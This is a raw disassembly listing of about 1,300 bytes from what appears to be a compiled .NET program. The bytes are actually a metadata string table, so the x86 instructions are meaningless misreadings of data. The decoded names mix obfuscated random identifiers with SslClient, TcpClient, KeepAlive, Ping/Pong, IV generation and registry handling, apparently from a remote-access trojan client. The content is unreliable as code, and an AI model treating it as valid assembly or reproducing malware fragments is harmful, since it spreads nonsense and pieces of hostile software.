  408001:	76 61                	jbe    0x408064
  408003:	55                   	push   %ebp
  408004:	00 56 42             	add    %dl,0x42(%esi)
  408007:	78 44                	js     0x40804d
  408009:	4a                   	dec    %edx
  40800a:	42                   	inc    %edx
  40800b:	78 65                	js     0x408072
  40800d:	73 76                	jae    0x408085
  40800f:	43                   	inc    %ebx
  408010:	56                   	push   %esi
  408011:	00 67 65             	add    %ah,0x65(%edi)
  408014:	74 5f                	je     0x408075
  408016:	49                   	dec    %ecx
  408017:	56                   	push   %esi
  408018:	00 73 65             	add    %dh,0x65(%ebx)
  40801b:	74 5f                	je     0x40807c
  40801d:	49                   	dec    %ecx
  40801e:	56                   	push   %esi
  40801f:	00 63 6d             	add    %ah,0x6d(%ebx)
  408022:	55                   	push   %ebp
  408023:	4e                   	dec    %esi
  408024:	71 44                	jno    0x40806a
  408026:	67 6e                	outsb  %ds:(%si),(%dx)
  408028:	65 55                	gs push %ebp
  40802a:	44                   	inc    %esp
  40802b:	6a 63                	push   $0x63
  40802d:	49                   	dec    %ecx
  40802e:	56                   	push   %esi
  40802f:	00 47 65             	add    %al,0x65(%edi)
  408032:	6e                   	outsb  %ds:(%esi),(%dx)
  408033:	65 72 61             	gs jb  0x408097
  408036:	74 65                	je     0x40809d
  408038:	49                   	dec    %ecx
  408039:	56                   	push   %esi
  40803a:	00 58 45             	add    %bl,0x45(%eax)
  40803d:	6f                   	outsl  %ds:(%esi),(%dx)
  40803e:	6d                   	insl   (%dx),%es:(%edi)
  40803f:	4f                   	dec    %edi
  408040:	69 46 53 5a 4c 4f 56 	imul   $0x564f4c5a,0x53(%esi),%eax
  408047:	00 41 77             	add    %al,0x77(%ecx)
  40804a:	54                   	push   %esp
  40804b:	45                   	inc    %ebp
  40804c:	51                   	push   %ecx
  40804d:	70 42                	jo     0x408091
  40804f:	50                   	push   %eax
  408050:	6b 42 6c 5a          	imul   $0x5a,0x6c(%edx),%eax
  408054:	56                   	push   %esi
  408055:	00 4a 76             	add    %cl,0x76(%edx)
  408058:	54                   	push   %esp
  408059:	4d                   	dec    %ebp
  40805a:	46                   	inc    %esi
  40805b:	69 69 64 61 56 00 75 	imul   $0x75005661,0x64(%ecx),%ebp
  408062:	76 44                	jbe    0x4080a8
  408064:	58                   	pop    %eax
  408065:	4c                   	dec    %esp
  408066:	6c                   	insb   (%dx),%es:(%edi)
  408067:	54                   	push   %esp
  408068:	53                   	push   %ebx
  408069:	49                   	dec    %ecx
  40806a:	6f                   	outsl  %ds:(%esi),(%dx)
  40806b:	43                   	inc    %ebx
  40806c:	52                   	push   %edx
  40806d:	6b 63 62 56          	imul   $0x56,0x62(%ebx),%esp
  408071:	00 70 7a             	add    %dh,0x7a(%eax)
  408074:	78 58                	js     0x4080ce
  408076:	4b                   	dec    %ebx
  408077:	54                   	push   %esp
  408078:	5a                   	pop    %edx
  408079:	4b                   	dec    %ebx
  40807a:	68 6a 77 70 56       	push   $0x5670776a
  40807f:	00 6f 61             	add    %ch,0x61(%edi)
  408082:	4d                   	dec    %ebp
  408083:	4b                   	dec    %ebx
  408084:	4b                   	dec    %ebx
  408085:	5a                   	pop    %edx
  408086:	62 47 66             	bound  %eax,0x66(%edi)
  408089:	4d                   	dec    %ebp
  40808a:	57                   	push   %edi
  40808b:	00 79 57             	add    %bh,0x57(%ecx)
  40808e:	67 52                	addr16 push %edx
  408090:	74 41                	je     0x4080d3
  408092:	59                   	pop    %ecx
  408093:	4c                   	dec    %esp
  408094:	56                   	push   %esi
  408095:	6f                   	outsl  %ds:(%esi),(%dx)
  408096:	71 70                	jno    0x408108
  408098:	67 57                	addr16 push %edi
  40809a:	00 56 74             	add    %dl,0x74(%esi)
  40809d:	5a                   	pop    %edx
  40809e:	54                   	push   %esp
  40809f:	7a 6c                	jp     0x40810d
  4080a1:	4e                   	dec    %esi
  4080a2:	66 6f                	outsw  %ds:(%esi),(%dx)
  4080a4:	46                   	inc    %esi
  4080a5:	57                   	push   %edi
  4080a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4080a7:	57                   	push   %edi
  4080a8:	00 6a 75             	add    %ch,0x75(%edx)
  4080ab:	51                   	push   %ecx
  4080ac:	76 64                	jbe    0x408112
  4080ae:	53                   	push   %ebx
  4080af:	52                   	push   %edx
  4080b0:	62 77 4c             	bound  %esi,0x4c(%edi)
  4080b3:	79 57                	jns    0x40810c
  4080b5:	00 61 47             	add    %ah,0x47(%ecx)
  4080b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4080b9:	71 64                	jno    0x40811f
  4080bb:	7a 65                	jp     0x408122
  4080bd:	77 45                	ja     0x408104
  4080bf:	58                   	pop    %eax
  4080c0:	00 77 70             	add    %dh,0x70(%edi)
  4080c3:	5a                   	pop    %edx
  4080c4:	63 49 67             	arpl   %ecx,0x67(%ecx)
  4080c7:	77 56                	ja     0x40811f
  4080c9:	71 50                	jno    0x40811b
  4080cb:	76 47                	jbe    0x408114
  4080cd:	58                   	pop    %eax
  4080ce:	00 4c 62 52          	add    %cl,0x52(%edx,%eiz,2)
  4080d2:	57                   	push   %edi
  4080d3:	4c                   	dec    %esp
  4080d4:	42                   	inc    %edx
  4080d5:	55                   	push   %ebp
  4080d6:	58                   	pop    %eax
  4080d7:	49                   	dec    %ecx
  4080d8:	58                   	pop    %eax
  4080d9:	00 61 44             	add    %ah,0x44(%ecx)
  4080dc:	79 6e                	jns    0x40814c
  4080de:	63 57 42             	arpl   %edx,0x42(%edi)
  4080e1:	47                   	inc    %edi
  4080e2:	43                   	inc    %ebx
  4080e3:	42                   	inc    %edx
  4080e4:	46                   	inc    %esi
  4080e5:	71 4b                	jno    0x408132
  4080e7:	58                   	pop    %eax
  4080e8:	00 7a 6c             	add    %bh,0x6c(%edx)
  4080eb:	59                   	pop    %ecx
  4080ec:	45                   	inc    %ebp
  4080ed:	56                   	push   %esi
  4080ee:	49                   	dec    %ecx
  4080ef:	76 44                	jbe    0x408135
  4080f1:	51                   	push   %ecx
  4080f2:	58                   	pop    %eax
  4080f3:	00 64 46 6d          	add    %ah,0x6d(%esi,%eax,2)
  4080f7:	58                   	pop    %eax
  4080f8:	4e                   	dec    %esi
  4080f9:	67 5a                	addr16 pop %edx
  4080fb:	53                   	push   %ebx
  4080fc:	72 6e                	jb     0x40816c
  4080fe:	62 55 58             	bound  %edx,0x58(%ebp)
  408101:	00 61 64             	add    %ah,0x64(%ecx)
  408104:	45                   	inc    %ebp
  408105:	47                   	inc    %edi
  408106:	6c                   	insb   (%dx),%es:(%edi)
  408107:	59                   	pop    %ecx
  408108:	5a                   	pop    %edx
  408109:	73 66                	jae    0x408171
  40810b:	55                   	push   %ebp
  40810c:	58                   	pop    %eax
  40810d:	00 74 4f 47          	add    %dh,0x47(%edi,%ecx,2)
  408111:	79 71                	jns    0x408184
  408113:	75 61                	jne    0x408176
  408115:	47                   	inc    %edi
  408116:	75 67                	jne    0x40817f
  408118:	56                   	push   %esi
  408119:	58                   	pop    %eax
  40811a:	00 51 4c             	add    %dl,0x4c(%ecx)
  40811d:	78 6a                	js     0x408189
  40811f:	64 59                	fs pop %ecx
  408121:	62 6b 66             	bound  %ebp,0x66(%ebx)
  408124:	62 58 59             	bound  %ebx,0x59(%eax)
  408127:	58                   	pop    %eax
  408128:	00 49 62             	add    %cl,0x62(%ecx)
  40812b:	6c                   	insb   (%dx),%es:(%edi)
  40812c:	49                   	dec    %ecx
  40812d:	52                   	push   %edx
  40812e:	49                   	dec    %ecx
  40812f:	47                   	inc    %edi
  408130:	49                   	dec    %ecx
  408131:	4b                   	dec    %ebx
  408132:	47                   	inc    %edi
  408133:	51                   	push   %ecx
  408134:	46                   	inc    %esi
  408135:	49                   	dec    %ecx
  408136:	68 58 00 6f 51       	push   $0x516f0058
  40813b:	75 76                	jne    0x4081b3
  40813d:	79 75                	jns    0x4081b4
  40813f:	73 48                	jae    0x408189
  408141:	68 72 6a 58 00       	push   $0x586a72
  408146:	4d                   	dec    %ebp
  408147:	6b 5a 68 74          	imul   $0x74,0x68(%edx),%ebx
  40814b:	77 59                	ja     0x4081a6
  40814d:	5a                   	pop    %edx
  40814e:	41                   	inc    %ecx
  40814f:	48                   	dec    %eax
  408150:	59                   	pop    %ecx
  408151:	6c                   	insb   (%dx),%es:(%edi)
  408152:	64 4b                	fs dec %ebx
  408154:	6c                   	insb   (%dx),%es:(%edi)
  408155:	58                   	pop    %eax
  408156:	00 4e 51             	add    %cl,0x51(%esi)
  408159:	56                   	push   %esi
  40815a:	78 5a                	js     0x4081b6
  40815c:	75 70                	jne    0x4081ce
  40815e:	7a 61                	jp     0x4081c1
  408160:	74 52                	je     0x4081b4
  408162:	59                   	pop    %ecx
  408163:	00 4f 4f             	add    %cl,0x4f(%edi)
  408166:	4a                   	dec    %edx
  408167:	45                   	inc    %ebp
  408168:	71 67                	jno    0x4081d1
  40816a:	71 5a                	jno    0x4081c6
  40816c:	66 59                	pop    %cx
  40816e:	00 41 41             	add    %al,0x41(%ecx)
  408171:	51                   	push   %ecx
  408172:	55                   	push   %ebp
  408173:	72 46                	jb     0x4081bb
  408175:	61                   	popa
  408176:	59                   	pop    %ecx
  408177:	5a                   	pop    %edx
  408178:	63 56 4e             	arpl   %edx,0x4e(%esi)
  40817b:	42                   	inc    %edx
  40817c:	5a                   	pop    %edx
  40817d:	00 72 58             	add    %dh,0x58(%edx)
  408180:	53                   	push   %ebx
  408181:	70 72                	jo     0x4081f5
  408183:	7a 6b                	jp     0x4081f0
  408185:	4a                   	dec    %edx
  408186:	7a 47                	jp     0x4081cf
  408188:	5a                   	pop    %edx
  408189:	00 4f 45             	add    %cl,0x45(%edi)
  40818c:	44                   	inc    %esp
  40818d:	6b 7a 41 78          	imul   $0x78,0x41(%edx),%edi
  408191:	79 58                	jns    0x4081eb
  408193:	4b                   	dec    %ebx
  408194:	71 41                	jno    0x4081d7
  408196:	4e                   	dec    %esi
  408197:	5a                   	pop    %edx
  408198:	00 76 44             	add    %dh,0x44(%esi)
  40819b:	44                   	inc    %esp
  40819c:	43                   	inc    %ebx
  40819d:	75 5a                	jne    0x4081f9
  40819f:	76 4e                	jbe    0x4081ef
  4081a1:	63 51 5a             	arpl   %edx,0x5a(%ecx)
  4081a4:	00 6c 6d 45          	add    %ch,0x45(%ebp,%ebp,2)
  4081a8:	4c                   	dec    %esp
  4081a9:	77 44                	ja     0x4081ef
  4081ab:	6b 6f 59 6f          	imul   $0x6f,0x59(%edi),%ebp
  4081af:	6d                   	insl   (%dx),%es:(%edi)
  4081b0:	71 61                	jno    0x408213
  4081b2:	5a                   	pop    %edx
  4081b3:	00 5a 59             	add    %bl,0x59(%edx)
  4081b6:	73 67                	jae    0x40821f
  4081b8:	68 45 47 50 66       	push   $0x66504745
  4081bd:	73 53                	jae    0x408212
  4081bf:	66 63 5a 00          	arpl   %bx,0x0(%edx)
  4081c3:	72 44                	jb     0x408209
  4081c5:	72 5a                	jb     0x408221
  4081c7:	47                   	inc    %edi
  4081c8:	63 7a 63             	arpl   %edi,0x63(%edx)
  4081cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4081cc:	70 5a                	jo     0x408228
  4081ce:	00 75 6c             	add    %dh,0x6c(%ebp)
  4081d1:	67 4f                	addr16 dec %edi
  4081d3:	47                   	inc    %edi
  4081d4:	7a 59                	jp     0x40822f
  4081d6:	45                   	inc    %ebp
  4081d7:	69 73 5a 00 7a 4a 59 	imul   $0x594a7a00,0x5a(%ebx),%esi
  4081de:	48                   	dec    %eax
  4081df:	4a                   	dec    %edx
  4081e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4081e1:	6c                   	insb   (%dx),%es:(%edi)
  4081e2:	74 55                	je     0x408239
  4081e4:	6b 62 58 77          	imul   $0x77,0x58(%edx),%esp
  4081e8:	5a                   	pop    %edx
  4081e9:	00 76 61             	add    %dh,0x61(%esi)
  4081ec:	6c                   	insb   (%dx),%es:(%edi)
  4081ed:	75 65                	jne    0x408254
  4081ef:	5f                   	pop    %edi
  4081f0:	5f                   	pop    %edi
  4081f1:	00 62 4f             	add    %ah,0x4f(%edx)
  4081f4:	59                   	pop    %ecx
  4081f5:	67 6b 77 72 69       	imul   $0x69,0x72(%bx),%esi
  4081fa:	50                   	push   %eax
  4081fb:	4f                   	dec    %edi
  4081fc:	61                   	popa
  4081fd:	00 63 42             	add    %ah,0x42(%ebx)
  408200:	53                   	push   %ebx
  408201:	51                   	push   %ecx
  408202:	6c                   	insb   (%dx),%es:(%edi)
  408203:	75 55                	jne    0x40825a
  408205:	76 67                	jbe    0x40826e
  408207:	4c                   	dec    %esp
  408208:	51                   	push   %ecx
  408209:	6f                   	outsl  %ds:(%esi),(%dx)
  40820a:	54                   	push   %esp
  40820b:	61                   	popa
  40820c:	00 5a 53             	add    %bl,0x53(%edx)
  40820f:	45                   	inc    %ebp
  408210:	42                   	inc    %edx
  408211:	58                   	pop    %eax
  408212:	45                   	inc    %ebp
  408213:	67 42                	addr16 inc %edx
  408215:	61                   	popa
  408216:	49                   	dec    %ecx
  408217:	6a 56                	push   $0x56
  408219:	61                   	popa
  40821a:	00 79 61             	add    %bh,0x61(%ecx)
  40821d:	71 50                	jno    0x40826f
  40821f:	50                   	push   %eax
  408220:	4f                   	dec    %edi
  408221:	49                   	dec    %ecx
  408222:	73 77                	jae    0x40829b
  408224:	51                   	push   %ecx
  408225:	54                   	push   %esp
  408226:	5a                   	pop    %edx
  408227:	74 61                	je     0x40828a
  408229:	00 4c 68 77          	add    %cl,0x77(%eax,%ebp,2)
  40822d:	52                   	push   %edx
  40822e:	6d                   	insl   (%dx),%es:(%edi)
  40822f:	58                   	pop    %eax
  408230:	42                   	inc    %edx
  408231:	72 6d                	jb     0x4082a0
  408233:	72 78                	jb     0x4082ad
  408235:	61                   	popa
  408236:	00 75 51             	add    %dh,0x51(%ebp)
  408239:	51                   	push   %ecx
  40823a:	6f                   	outsl  %ds:(%esi),(%dx)
  40823b:	74 55                	je     0x408292
  40823d:	43                   	inc    %ebx
  40823e:	6f                   	outsl  %ds:(%esi),(%dx)
  40823f:	4d                   	dec    %ebp
  408240:	62 00                	bound  %eax,(%eax)
  408242:	69 62 7a 78 45 50 67 	imul   $0x67504578,0x7a(%edx),%esp
  408249:	5a                   	pop    %edx
  40824a:	69 55 62 00 47 70 62 	imul   $0x62704700,0x62(%ebp),%edx
  408251:	47                   	inc    %edi
  408252:	79 46                	jns    0x40829a
  408254:	7a 76                	jp     0x4082cc
  408256:	4b                   	dec    %ebx
  408257:	58                   	pop    %eax
  408258:	62 00                	bound  %eax,(%eax)
  40825a:	69 70 6c 75 69 4c 72 	imul   $0x724c6975,0x6c(%eax),%esi
  408261:	6d                   	insl   (%dx),%es:(%edi)
  408262:	45                   	inc    %ebp
  408263:	66 62 00             	bound  %ax,(%eax)
  408266:	6d                   	insl   (%dx),%es:(%edi)
  408267:	73 63                	jae    0x4082cc
  408269:	6f                   	outsl  %ds:(%esi),(%dx)
  40826a:	72 6c                	jb     0x4082d8
  40826c:	69 62 00 58 52 6b 4c 	imul   $0x4c6b5258,0x0(%edx),%esp
  408273:	4a                   	dec    %edx
  408274:	6c                   	insb   (%dx),%es:(%edi)
  408275:	63 69 55             	arpl   %ebp,0x55(%ecx)
  408278:	77 74                	ja     0x4082ee
  40827a:	62 00                	bound  %eax,(%eax)
  40827c:	67 54                	addr16 push %esp
  40827e:	7a 4b                	jp     0x4082cb
  408280:	47                   	inc    %edi
  408281:	55                   	push   %ebp
  408282:	56                   	push   %esi
  408283:	50                   	push   %eax
  408284:	65 7a 74             	gs jp  0x4082fb
  408287:	62 00                	bound  %eax,(%eax)
  408289:	48                   	dec    %eax
  40828a:	77 49                	ja     0x4082d5
  40828c:	63 63 41             	arpl   %esp,0x41(%ebx)
  40828f:	6e                   	outsb  %ds:(%esi),(%dx)
  408290:	4f                   	dec    %edi
  408291:	6d                   	insl   (%dx),%es:(%edi)
  408292:	4a                   	dec    %edx
  408293:	52                   	push   %edx
  408294:	77 62                	ja     0x4082f8
  408296:	00 61 72             	add    %ah,0x72(%ecx)
  408299:	77 4d                	ja     0x4082e8
  40829b:	4a                   	dec    %edx
  40829c:	6d                   	insl   (%dx),%es:(%edi)
  40829d:	6c                   	insb   (%dx),%es:(%edi)
  40829e:	4b                   	dec    %ebx
  40829f:	59                   	pop    %ecx
  4082a0:	62 59 43             	bound  %ebx,0x43(%ecx)
  4082a3:	69 6c 4c 63 00 6f 59 	imul   $0x42596f00,0x63(%esp,%ecx,2),%ebp
  4082aa:	42 
  4082ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4082ac:	6b 45 4e 53          	imul   $0x53,0x4e(%ebp),%eax
  4082b0:	5a                   	pop    %edx
  4082b1:	70 4a                	jo     0x4082fd
  4082b3:	58                   	pop    %eax
  4082b4:	63 00                	arpl   %eax,(%eax)
  4082b6:	59                   	pop    %ecx
  4082b7:	4f                   	dec    %edi
  4082b8:	48                   	dec    %eax
  4082b9:	65 52                	gs push %edx
  4082bb:	59                   	pop    %ecx
  4082bc:	43                   	inc    %ebx
  4082bd:	77 64                	ja     0x408323
  4082bf:	63 00                	arpl   %eax,(%eax)
  4082c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4082c2:	54                   	push   %esp
  4082c3:	66 76 43             	data16 jbe 0x408309
  4082c6:	6b 67 46 41          	imul   $0x41,0x46(%edi),%esp
  4082ca:	68 63 00 53 79       	push   $0x79530063
  4082cf:	73 74                	jae    0x408345
  4082d1:	65 6d                	gs insl (%dx),%es:(%edi)
  4082d3:	2e 43                	cs inc %ebx
  4082d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4082d6:	6c                   	insb   (%dx),%es:(%edi)
  4082d7:	6c                   	insb   (%dx),%es:(%edi)
  4082d8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4082dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4082de:	73 2e                	jae    0x40830e
  4082e0:	47                   	inc    %edi
  4082e1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4082e3:	65 72 69             	gs jb  0x40834f
  4082e6:	63 00                	arpl   %eax,(%eax)
  4082e8:	4d                   	dec    %ebp
  4082e9:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4082f0:	74 2e                	je     0x408320
  4082f2:	56                   	push   %esi
  4082f3:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4082fa:	73 69                	jae    0x408365
  4082fc:	63 00                	arpl   %eax,(%eax)
  4082fe:	67 65 74 5f          	addr16 gs je 0x408361
  408302:	53                   	push   %ebx
  408303:	65 6e                	outsb  %gs:(%esi),(%dx)
  408305:	64 53                	fs push %ebx
  408307:	79 6e                	jns    0x408377
  408309:	63 00                	arpl   %eax,(%eax)
  40830b:	72 63                	jb     0x408370
  40830d:	61                   	popa
  40830e:	4e                   	dec    %esi
  40830f:	44                   	inc    %esp
  408310:	5a                   	pop    %edx
  408311:	43                   	inc    %ebx
  408312:	4c                   	dec    %esp
  408313:	75 42                	jne    0x408357
  408315:	4d                   	dec    %ebp
  408316:	42                   	inc    %edx
  408317:	73 63                	jae    0x40837c
  408319:	00 7a 4b             	add    %bh,0x4b(%edx)
  40831c:	45                   	inc    %ebp
  40831d:	57                   	push   %edi
  40831e:	61                   	popa
  40831f:	6b 6f 4a 4e          	imul   $0x4e,0x4a(%edi),%ebp
  408323:	61                   	popa
  408324:	7a 63                	jp     0x408389
  408326:	00 6f 62             	add    %ch,0x62(%edi)
  408329:	4f                   	dec    %edi
  40832a:	53                   	push   %ebx
  40832b:	74 4b                	je     0x408378
  40832d:	69 79 51 52 46 50 64 	imul   $0x64504652,0x51(%ecx),%edi
  408334:	00 4c 55 57          	add    %cl,0x57(%ebp,%edx,2)
  408338:	75 64                	jne    0x40839e
  40833a:	56                   	push   %esi
  40833b:	6a 7a                	push   $0x7a
  40833d:	43                   	inc    %ebx
  40833e:	4c                   	dec    %esp
  40833f:	4e                   	dec    %esi
  408340:	44                   	inc    %esp
  408341:	55                   	push   %ebp
  408342:	64 00 61 43          	add    %ah,%fs:0x43(%ecx)
  408346:	58                   	pop    %eax
  408347:	74 68                	je     0x4083b1
  408349:	69 45 4d 42 55 56 64 	imul   $0x64565542,0x4d(%ebp),%eax
  408350:	00 67 44             	add    %ah,0x44(%edi)
  408353:	7a 59                	jp     0x4083ae
  408355:	78 74                	js     0x4083cb
  408357:	48                   	dec    %eax
  408358:	50                   	push   %eax
  408359:	43                   	inc    %ebx
  40835a:	7a 5a                	jp     0x4083b6
  40835c:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  408360:	64 52                	fs push %edx
  408362:	65 61                	gs popa
  408364:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  408368:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  40836f:	00 
  408370:	54                   	push   %esp
  408371:	68 72 65 61 64       	push   $0x64616572
  408376:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  40837a:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  40837e:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  408382:	41                   	inc    %ecx
  408383:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  408389:	61                   	popa
  40838a:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  408390:	74 5f                	je     0x4083f1
  408392:	43                   	inc    %ebx
  408393:	6f                   	outsl  %ds:(%esi),(%dx)
  408394:	6e                   	outsb  %ds:(%esi),(%dx)
  408395:	6e                   	outsb  %ds:(%esi),(%dx)
  408396:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40839b:	00 67 65             	add    %ah,0x65(%edi)
  40839e:	74 5f                	je     0x4083ff
  4083a0:	49                   	dec    %ecx
  4083a1:	73 43                	jae    0x4083e6
  4083a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a6:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4083ab:	00 73 65             	add    %dh,0x65(%ebx)
  4083ae:	74 5f                	je     0x40840f
  4083b0:	49                   	dec    %ecx
  4083b1:	73 43                	jae    0x4083f6
  4083b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4083b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4083b6:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4083bb:	00 67 65             	add    %ah,0x65(%edi)
  4083be:	74 5f                	je     0x40841f
  4083c0:	47                   	inc    %edi
  4083c1:	75 69                	jne    0x40842c
  4083c3:	64 00 3c 53          	add    %bh,%fs:(%ebx,%edx,2)
  4083c7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4083c9:	64 53                	fs push %ebx
  4083cb:	79 6e                	jns    0x40843b
  4083cd:	63 3e                	arpl   %edi,(%esi)
  4083cf:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4083d3:	61                   	popa
  4083d4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4083d8:	67 46                	addr16 inc %esi
  4083da:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  4083e1:	73 43                	jae    0x408426
  4083e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4083e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e6:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4083eb:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  4083f0:	61                   	popa
  4083f1:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f5:	67 46                	addr16 inc %esi
  4083f7:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  4083fe:	65 65 70 41          	gs gs jo 0x408443
  408402:	6c                   	insb   (%dx),%es:(%edi)
  408403:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  40840a:	42                   	inc    %edx
  40840b:	61                   	popa
  40840c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40840f:	6e                   	outsb  %ds:(%esi),(%dx)
  408410:	67 46                	addr16 inc %esi
  408412:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  408419:	65 61                	gs popa
  40841b:	64 65 72 53          	fs gs jb 0x408472
  40841f:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  408426:	42                   	inc    %edx
  408427:	61                   	popa
  408428:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40842b:	6e                   	outsb  %ds:(%esi),(%dx)
  40842c:	67 46                	addr16 inc %esi
  40842e:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  408435:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  40843c:	42                   	inc    %edx
  40843d:	61                   	popa
  40843e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408441:	6e                   	outsb  %ds:(%esi),(%dx)
  408442:	67 46                	addr16 inc %esi
  408444:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  40844b:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40844f:	61                   	popa
  408450:	74 65                	je     0x4084b7
  408452:	50                   	push   %eax
  408453:	6f                   	outsl  %ds:(%esi),(%dx)
  408454:	6e                   	outsb  %ds:(%esi),(%dx)
  408455:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  40845b:	61                   	popa
  40845c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40845f:	6e                   	outsb  %ds:(%esi),(%dx)
  408460:	67 46                	addr16 inc %esi
  408462:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  408469:	6e                   	outsb  %ds:(%esi),(%dx)
  40846a:	74 65                	je     0x4084d1
  40846c:	72 76                	jb     0x4084e4
  40846e:	61                   	popa
  40846f:	6c                   	insb   (%dx),%es:(%edi)
  408470:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  408475:	61                   	popa
  408476:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408479:	6e                   	outsb  %ds:(%esi),(%dx)
  40847a:	67 46                	addr16 inc %esi
  40847c:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  408483:	75 66                	jne    0x4084eb
  408485:	66 65 72 3e          	data16 gs jb 0x4084c7
  408489:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  40848d:	61                   	popa
  40848e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408491:	6e                   	outsb  %ds:(%esi),(%dx)
  408492:	67 46                	addr16 inc %esi
  408494:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  40849b:	66 66 73 65          	data16 data16 jae 0x408504
  40849f:	74 3e                	je     0x4084df
  4084a1:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4084a5:	61                   	popa
  4084a6:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4084aa:	67 46                	addr16 inc %esi
  4084ac:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  4084b3:	73 6c                	jae    0x408521
  4084b5:	43                   	inc    %ebx
  4084b6:	6c                   	insb   (%dx),%es:(%edi)
  4084b7:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  4084be:	5f                   	pop    %edi
  4084bf:	42                   	inc    %edx
  4084c0:	61                   	popa
  4084c1:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4084c5:	67 46                	addr16 inc %esi
  4084c7:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  4084ce:	63 70 43             	arpl   %esi,0x43(%eax)
  4084d1:	6c                   	insb   (%dx),%es:(%edi)
  4084d2:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  4084d9:	5f                   	pop    %edi
  4084da:	42                   	inc    %edx
  4084db:	61                   	popa
  4084dc:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084df:	6e                   	outsb  %ds:(%esi),(%dx)
  4084e0:	67 46                	addr16 inc %esi
  4084e2:	69 65 6c 64 00 41 70 	imul   $0x70410064,0x6c(%ebp),%esp
  4084e9:	70 65                	jo     0x408550
  4084eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ec:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  4084f0:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  4084f7:	61 
  4084f8:	6c                   	insb   (%dx),%es:(%edi)
  4084f9:	75 65                	jne    0x408560
  4084fb:	4b                   	dec    %ebx
  4084fc:	69 6e 64 00 7a 51 57 	imul   $0x57517a00,0x64(%esi),%ebp
  408503:	4f                   	dec    %edi
  408504:	4e                   	dec    %esi
  408505:	44                   	inc    %esp
  408506:	78 41                	js     0x408549
  408508:	44                   	inc    %esp
